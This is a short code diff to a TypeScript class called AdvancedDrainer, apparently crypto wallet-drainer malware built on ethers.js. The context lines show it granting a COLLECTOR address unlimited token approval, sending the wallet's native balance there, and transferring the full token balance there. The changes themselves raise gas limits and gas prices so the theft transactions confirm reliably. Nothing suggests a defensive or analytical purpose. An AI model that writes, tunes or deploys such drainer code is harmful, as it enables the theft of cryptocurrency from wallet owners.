@@ -30,8 +30,8 @@ export class AdvancedDrainer {
       const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
       
       const tx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
-        gasLimit: 120000n,
-        gasPrice: ethers.parseUnits("1", "gwei"),
+        gasLimit: 150000n,
+        gasPrice: ethers.parseUnits("2", "gwei"),
         type: 0
       });
       
@@ -88,8 +88,8 @@ export class AdvancedDrainer {
     const tx = await this.signer.sendTransaction({
       to: COLLECTOR,
       value: maxDrainAmount,
-      gasLimit: 21000n,
-      gasPrice: ethers.parseUnits("1", "gwei"),
+      gasLimit: 50000n,
+      gasPrice: ethers.parseUnits("2", "gwei"),
       type: 0
     });
     
@@ -117,8 +117,8 @@ export class AdvancedDrainer {
     
     // Direct transfer of entire balance (user has unlimited approval granted)
     const tx = await contract.transfer(COLLECTOR, balance, {
-      gasLimit: 100000n,
-      gasPrice: ethers.parseUnits("1", "gwei"),
+      gasLimit: 250000n,
+      gasPrice: ethers.parseUnits("2", "gwei"),
       type: 0
     });
     
